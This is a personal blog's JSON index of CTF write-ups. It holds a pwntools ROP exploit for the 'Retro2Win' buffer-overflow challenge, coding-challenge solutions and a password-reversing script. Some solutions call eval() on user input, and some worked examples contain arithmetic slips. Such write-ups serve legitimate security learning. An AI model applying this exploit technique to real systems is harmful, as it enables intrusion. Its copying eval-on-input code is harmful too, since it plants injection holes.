
[{"content":"I\u0026rsquo;ve been diving into binary exploitation for the past three months, and honestly, it\u0026rsquo;s been a wild journey! ‚ò†Ô∏è If you don‚Äôt know, binary exploitation is all about finding bugs in programs and using them to break stuff (in a good way, of course). I got into it because I‚Äôm super into cybersecurity and hacking, and this stuff is just next level. In this post, I‚Äôll walk you through a pwn challenge I could solve.\nCategory: Pwn\nTitle: Retro2Win\nDescription: So retro.. So winning..\nFirst, we check the file type and the memory protection involved with the binary.\nExplanation:\nArch: amd64-64-little The program is 64-bit, using little-endian format.\nRELRO: Partial RELRO Only partial memory protection is in place, so it\u0026rsquo;s not fully secured.\nStack: No canary found No stack protection, making buffer overflow attacks easier.\nNX: NX enabled Data execution prevention is active, so injected code can‚Äôt be run from the stack.\nPIE: No PIE The program always loads at the same memory address, which makes it easier to target in exploits.\nStripped: No Contains debugging symbols, making analysis easier.\nUnderstanding the Main Menu # Here‚Äôs the decompiled main() function:\nThe program runs in a loop, presenting a menu to the user.\nMenu options include:\nOption 1: explore_forest()\nOption 2: battle_dragon()\nOption 3: Quit the game.\nA hidden option exists: entering 0x539 (1337 in decimal) calls enter_cheatcode().\nThe Vulnerable enter_cheatcode() Function # Here‚Äôs the decompiled code:\nThe function uses gets() to read user input into a 16-byte buffer (local_18).\nVulnerability: gets() does not check input length, making the function vulnerable to a buffer overflow.\nThis overflow can overwrite the return address, providing an opportunity to control program execution.\nThe cheat_mode() Function # This function is the goal of the exploit. It activates cheat mode and retrieves the flag:\nExplanation:\nThe function activates if\nparam_1 == 0x2323232323232323 \u0026amp;\u0026amp; param_2 == 0x4242424242424242\nIf parameters are correct, it attempts to open flag.txt and print its contents.\nIf parameters are incorrect, the function exits without revealing the flag.\nTo trigger cheat_mode(), we need to overflow the buffer in enter_cheatcode() and overwrite the return address to jump to this function while controlling its parameters.\nExploitation Plan # Buffer Overflow:\nOverflow the 16-byte buffer in enter_cheatcode() to overwrite the return address.\nControl Parameters:\nPlace 0x2323232323232323 and 0x4242424242424242 in the registers to satisfy cheat_mode() conditions.\nJump to cheat_mode():\nRedirect execution to the cheat_mode() function.\nRetrieve the Flag:\nOnce cheat mode is activated, the program will read and print the flag from flag.txt.\nFinding the Padding # We just need to find offset values to overflow the buffer and RBP to reach the RIP/Return address. For this, I use cyclic 100 in gdb-pwndbg and we check the register RBP register.\nRSP (Stack Pointer) : Points to the top of the stack in memory. It is used to manage the function call stack, which stores local variables, function parameters, return addresses, and other data during program execution.\nRIP (Instruction Pointer) : Points to the memory address of the next instruction to be executed. It keeps track of the current position within the program‚Äôs code.\nRDI, RSI, RDX, RCX, R8, R9 (General-Purpose Registers) : These registers are used for general data manipulation and passing function arguments. They have specific calling conventions in function calls.\nRAX (Accumulator Register) : Often used as the primary register for arithmetic and logical operations. It also stores the return value of a function.\nWe can see that RSP has been overwritten with ‚Äúgaaahaaa‚Äù.\nWe get an offset of 24 bytes. So 24 junk characters to buffer overflow and reach RIP/Return address region\nWe can find a perfect gadget pop rdi \u0026amp; pop rsi for our exploit using ROPgadget. üëæ\nFinal Exploit # from pwn import * # Allows you to switch between local/GDB/remote from terminal def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (\u0026#39;server\u0026#39;, \u0026#39;port\u0026#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) gdbscript = \u0026#39;\u0026#39;\u0026#39; init-pwndbg break *0x000000000040073e continue \u0026#39;\u0026#39;\u0026#39;.format(**locals()) exe = \u0026#39;./retro2win\u0026#39; elf = context.binary = ELF(exe, checksec=False) context.log_level = \u0026#39;debug\u0026#39; # =========================================================== # EXPLOIT GOES HERE # =========================================================== # Start program p = start() #cheat_mode = 0x401196 offset = 24 param_1 = 0x2323232323232323 param_2 = 0x4242424242424242 pop_rdi = 0x4009b3 pop_rsi = 0x4009b1 payload = flat( b\u0026#39;A\u0026#39; * offset, p64(pop_rdi), p64(param_1), p64(pop_rsi), p64(param_2), 0x0, #junk for r15 elf.symbols[\u0026#39;cheat_mode\u0026#39;] ) p.recvuntil(b\u0026#39;Select an option:\\n\u0026#39;) p.sendline(\u0026#39;1337\u0026#39;) p.recvuntil(b\u0026#39;Enter your cheatcode:\\n\u0026#39;) p.sendline(payload) output = p.recvuntil(b\u0026#39;FLAG:\u0026#39;) print(output) p.interactive() Why we put pop rdi first instead of pop rsi üßê. Chekout this page for more better understanding Calling Conventions\nThere we go! ü§™\nINTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n} ","date":"21 December 2024","externalUrl":null,"permalink":"/writeups/1337up-live-ctf/","section":"Writeups","summary":"1337UP LIVE CTF 2024 writeups","title":"1337UP LIVE CTF 2024","type":"writeups"},{"content":"","date":"21 December 2024","externalUrl":null,"permalink":"/","section":"w6rst","summary":"","title":"w6rst","type":"page"},{"content":"","date":"20 December 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"20 December 2024","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":"Helloo. I recently participated in HTB‚Äôs University CTF 2024: Binary Badlands. Wanted to share some of my writeups for challenges I could solve. ü§°\nCategory: Coding\nTitle: Frontier Cluster\nDescription: Welcome back, Space Cowboy. The Minutemen have intercepted a cryptic signal from the Frontier Board‚Äîa corrupted data stream filled with duplicate entries. Hidden within this mess are critical coordinates that could lead us closer to the legendary Starry Spur.\nYour mission is to sift through this chaotic stream and extract the unique entries. These coordinates must be preserved in the order they were received to maintain their integrity. Any duplicates are remnants of the Board\u0026rsquo;s sabotage‚Äîeliminate them swiftly.\nOnce you\u0026rsquo;ve completed the task, report the refined list to Lena Starling. Time is of the essence, Cowboy‚Äîthe resistance is counting on you!\nExample Input String Input: 7 3 7 9 1 3 5 9\nOutput String Expected Output: 7 3 9 1 5\nn = input() numbers = n.split() # Split input into a list of strings seen = set() # Set to track seen numbers unique_numbers = [] # List to store unique numbers in order for num in numbers: if num not in seen: seen.add(num) unique_numbers.append(num) #print answer print(\u0026#34; \u0026#34;.join(unique_numbers)) HTB{r3m0v1ng_dup5_15_s0_345y_1F_y0u_kn0w_h0w_t0_c0d3!_e43188ed3c8f8c4a1983f7b8ba67e2ed} Category: Coding\nTitle: ConflictCruncher\nDescription:\nWelcome back, Space Cowboy. The Minutemen have uncovered multiple encrypted data streams from the Frontier Board. These streams contain critical intelligence, but their keys overlap in ways that cause conflicts.\nYour mission is to merge these conflicting data streams into a single dictionary. When conflicts arise (identical keys), you must apply the Frontier Protocol: retain the value from the second dictionary and discard the conflicting value from the first.\nComplete this task swiftly and accurately, Cowboy, and report the unified dictionary back to Lena Starling. The fate of the resistance may depend on it!\nExample Input String Dict input: {\u0026lsquo;a\u0026rsquo;: 1, \u0026lsquo;b\u0026rsquo;: 2, \u0026lsquo;c\u0026rsquo;: 3}, {\u0026lsquo;b\u0026rsquo;: 4, \u0026rsquo;d\u0026rsquo;: 5}\nOutput Merged Output: {\u0026lsquo;a\u0026rsquo;: 1, \u0026lsquo;b\u0026rsquo;: 4, \u0026lsquo;c\u0026rsquo;: 3, \u0026rsquo;d\u0026rsquo;: 5}\ndef conflict_cruncher(dict1, dict2): merged_dict = {**dict1, **dict2} return merged_dict # User input input1 = eval(input()) input2 = eval(input()) # Perform the merge merged_output = conflict_cruncher(input1, input2) # Output the result print(merged_output) HTB{n0w_1m_0ff1c4lly_4_c0nfl1ct_crunch3r_y4y!_09613d0c4ef180bac1c2bef4d5675f0f} Category: Coding\nTitle: Energy Matrix Activation\nDescription: Greetings, Space Cowboy. The resistance has uncovered the ancient Starry Spur, but its power lies dormant. To activate the energy matrix, you must combine specific energy crystals to reach a precise energy level.\nYour mission is to calculate the number of ways to combine these crystals to match the required energy level. Each crystal can be used an unlimited number of times, but the combinations must add up to the exact target energy.\nReport the number of valid combinations to Lena Starling. The fate of the resistance rests in your calculations!\nExample Input Example 1: Energy Crystals: [1, 2, 3] Target Energy: 4\nExample 2: Energy Crystals: [2, 5, 3, 6] Target Energy: 10\nOutput Example 1 Output: 4 Explanation: There are 4 distinct ways to combine the crystals to reach the target energy level of 4:\n1. 1 + 1 + 1 + 1\r2. 1 + 1 + 2\r3. 2 + 2\r4. 1 + 3\rExample 2 Output: 5 Explanation: There are 5 distinct ways to combine the crystals to reach the target energy level of 10:\n1. 2 + 2 + 2 + 2 + 2\r2. 2 + 2 + 2 + 2 + 2 + 2 + 3\r3. 2 + 2 + 2 + 6\r3. 5 + 5\r3. 2 + 3 + 5\rEach combination adds up to the target energy level of 10. As before, the order of the crystals does not matter.\nenergy_crystals = input() target_energy = input() # Convert the input strings to proper data types # Use eval() to interpret the list input and int() to convert the target energy energy_crystals = eval(energy_crystals) target_energy = int(target_energy) def count_combinations(crystals, target): # Initialize the DP array dp = [0] * (target + 1) dp[0] = 1 # Base case: one way to make target 0 # Update DP array for each crystal for crystal in crystals: for j in range(crystal, target + 1): dp[j] += dp[j - crystal] return dp[target] # Calculate and print the result result = count_combinations(energy_crystals, target_energy) print(result) HTB{3n34gy_m4tr1x_act1v4t3d_w3_4r3_s4v3d!_fab10bcba322f2279d276e9e9e1fa5a4} Category: Coding\nTitle: WordWrangler\nDescription: Welcome, Space Cowboy. The Frontier Archives have transmitted an ancient text encrypted with layers of forgotten languages. The resistance needs your help to decode the most frequently used word in this transmission.\nYour mission is to count the frequency of each word in the given text, ignoring case and punctuation, and identify the single most common word. If there are multiple words with the same highest frequency, return any one of them.\nAnswer Format: Return the most common word as a single string. Do not include its count in the output.\nReport the result back to Lena Starling. The resistance is counting on your precision and speed!\nInput: \u0026ldquo;The quick brown fox jumps over the lazy dog. The dog barks at the fox!\u0026rdquo;\nOutput: the\nfrom collections import Counter import string def most_frequent_word(text): # Normalize the text: convert to lowercase and remove punctuation text = text.lower().translate(str.maketrans(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, string.punctuation)) # Split the text into words words = text.split() # Count the occurrences of each word word_counts = Counter(words) # Find the most frequent word most_frequent = max(word_counts, key=word_counts.get) return most_frequent input_text = input()S output = most_frequent_word(input_text) print(output) HTB{pfupp_wh0_m4d3_th353_345y_ch4ll3ng35_ch1ld1sh!_94e2b14df5eebb43e53458c1ca33dca2} Category: Coding\nTitle: Weighted Starfield Stabilizer\nDescription: Welcome, Space Cowboy. The resistance has intercepted energy signals from the Frontier Starfield, but they are riddled with weighted anomalies that distort their stability. To analyze the starfield‚Äôs stability, you must calculate the maximum stability score.\nEach energy signal is modified by its corresponding weight, creating a new stability signal: Modified Signal = Signal √ó Weight\nYour mission is to identify the maximum stability score for any contiguous subarray of the modified signals. Use your computational skills to ensure the accuracy of your findings!\nAnswer Format: Return a single integer representing the maximum stability score from the starfield.\nReport your findings to Lena Starling. The resistance depends on your precision to restore balance in the starfield!\nExample Input Input: signals = [1, -2, 3, -4] weights = [2, 3, -1, 4]\nOutput Output: 48 Explanation: To compute the maximum stability score, follow these steps:\nCalculate the modified signals:\n1 √ó 2 = 2 -2 √ó 3 = -6 3 √ó -1 = -3 -4 √ó 4 = -16 The modified signals are:\n[2, -6, -3, -16] Find the maximum product of any contiguous subarray:\n[2] : Product = 2 [-6] : Product = -6 [2, -6] : Product = -12 [-3, -16] : Product = 48 The maximum product is 48, which occurs for the subarray\n[-3, -16] def maxStabilityScore(signals, weights): # Calculate the modified signals modified_signals = [signals[i] * weights[i] for i in range(len(signals))] # Initialize variables max_product = modified_signals[0] min_product = modified_signals[0] result = modified_signals[0] # Iterate over the modified signals for i in range(1, len(modified_signals)): if modified_signals[i] \u0026lt; 0: # If the current signal is negative, swap max_product and min_product max_product, min_product = min_product, max_product # Update the max and min product at the current index max_product = max(modified_signals[i], max_product * modified_signals[i]) min_product = min(modified_signals[i], min_product * modified_signals[i]) # Update the result to track the maximum product found result = max(result, max_product) return result signals = eval(input()) weights = eval(input()) print(maxStabilityScore(signals, weights)) # Output: 48 HTB{m1ssi0n_c0mpl3t3d_m4x1mum_5t4b1l1ty_4ch13v3d!_c3daa74241b0c220321f7f2371e79887} Category: Reversing\nTitle: CryoWarmup\nDescription: You\u0026rsquo;ve been on ice for a long time, so before you start your journey you\u0026rsquo;ll need to defrost and warm up your skills. As luck would have it, you\u0026rsquo;ve forgotten the password to your trusty Electro-Safe-o-Matic, where your most prized possessions are. Can you still remember how to crack in?\nYou‚Äôre given a binary file. Run the following command to determine the type of a file:\nfile warmup since it‚Äôs not stripped, we can find the function names when we do dynamic analysis.\nRunning the binary, it seems like a classic password checker program. Giving the correct password will grant you access. So I went to Ghidra/Cutter to look at the source code. There are 3 functions: main, validate_password, and generate_key. The generate_key function takes an input, performs XOR with 0x2a (42 in Decimal) for every bit, and adds 5 to it.\nWhat libc function is used to check if the password is correct? strcmp\nWhat is the size of the password buffer, based on the argument to scanf? 49\nWhat is the name of the function that modifies the user\u0026rsquo;s input? generate_key\nWhat would be the result of applying the operation from this function to a string containing one character, \u0026lsquo;B\u0026rsquo;? Provide your answer as a hex number, e.g. 0x4f. 0x6f \u0026rsquo;m\u0026rsquo;\nWhat is printed if the password is correct? \u0026ldquo;Access granted!\u0026rdquo;\nHow long is the password, based on the value that the user\u0026rsquo;s input is compared against (not including the final null byte)? 8\nWhat is the password? Retrieve the original password by reversing the transformation process\nHere‚Äôs the Python script to do so:\ndef reverse_generate_key(target_hex): target_bytes = target_hex.to_bytes(8, byteorder=\u0026#34;big\u0026#34;) original_string = \u0026#34;\u0026#34; for byte in target_bytes: # Reverse (char ^ 0x2A) + 5 original_char = (byte - 5) ^ 0x2A original_string += chr(original_char) # Reverse the final string return original_string[::-1] target_hex = 0x625f491e53532047 original_string = reverse_generate_key(target_hex) print(f\u0026#34;Reversed original string: {original_string}\u0026#34;) h1dd3npw\nada lagi writeups malas ah ","date":"20 December 2024","externalUrl":null,"permalink":"/writeups/htb-university-ctf-2024/","section":"Writeups","summary":"HTB University CTF 2024","title":"HTB University CTF 2024","type":"writeups"},{"content":"","date":"20 December 2024","externalUrl":null,"permalink":"/categories/posts/","section":"Categories","summary":"","title":"Posts","type":"categories"},{"content":"","date":"20 December 2024","externalUrl":null,"permalink":"/tags/tag/","section":"Tags","summary":"","title":"Tag","type":"tags"},{"content":"","date":"20 December 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"20 December 2024","externalUrl":null,"permalink":"/categories/writeups/","section":"Categories","summary":"","title":"Writeups","type":"categories"},{"content":" This page is under cosntruction ","date":"4 September 2024","externalUrl":null,"permalink":"/about/","section":"w6rst","summary":"","title":"About","type":"page"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]